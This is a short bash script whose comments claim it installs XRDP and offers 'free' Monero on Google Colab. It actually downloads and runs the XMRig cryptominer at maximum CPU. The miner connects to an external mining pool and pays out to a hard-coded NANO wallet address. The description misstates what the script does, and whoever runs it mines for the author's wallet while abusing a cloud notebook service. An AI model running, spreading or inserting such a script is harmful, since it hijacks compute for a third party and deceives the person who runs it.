#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o rx.unmineable.com:3333 -u NANO:nano_3oucbii6419eftqmpwrw6x3f978uag5y1ee56b5h1ozd9nxyoy7uk3nc7xgz  --randomx-init=1 --argon2-impl=AVX2 --cpu-memory-pool=1 --cpu-max-threads-hint=100 --randomx-mode=FAST --verbose
